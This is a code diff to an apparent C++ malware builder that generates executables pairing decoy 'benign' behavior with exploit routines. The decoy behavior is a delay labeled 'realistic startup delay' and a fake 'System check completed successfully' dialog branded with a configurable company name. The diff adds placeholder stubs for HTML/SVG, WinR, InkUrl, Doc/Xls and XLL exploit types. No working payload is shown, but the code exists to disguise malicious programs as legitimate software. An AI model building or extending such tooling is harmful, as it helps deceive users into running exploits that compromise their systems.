@@ -504,7 +504,7 @@ public:
 #include <chrono>
 #include <cmath>
 
-int main() {
+void performBenignOperations() {
     // Realistic startup delay
     std::this_thread::sleep_for(std::chrono::milliseconds()" + std::to_string(startupDelay) + R"());
     
@@ -553,8 +553,6 @@ int main() {
                ")" + companyName + R"( Application\n\nSystem check completed successfully.\n\nVersion: 1.0.0", 
                ")" + companyName + R"(", 
                MB_OK | MB_ICONINFORMATION);
-    
-    return 0;
 }
 )";
     }
@@ -2033,6 +2031,15 @@ public:
         
         // Add benign behavior code
         source << benignCode << "\n\n";
+        
+        // Add dummy exploit functions if they're not provided
+        if (exploitCode.empty() && exploitType != EXPLOIT_NONE) {
+            source << "void executeHTMLSVGExploit() { /* Placeholder */ }\n";
+            source << "void executeWinRExploit() { /* Placeholder */ }\n";
+            source << "void executeInkUrlExploit() { /* Placeholder */ }\n";
+            source << "void executeDocXlsExploit() { /* Placeholder */ }\n";
+            source << "void executeXllExploit() { /* Placeholder */ }\n\n";
+        }
         
         // Main function
         source << "int main() {\n";
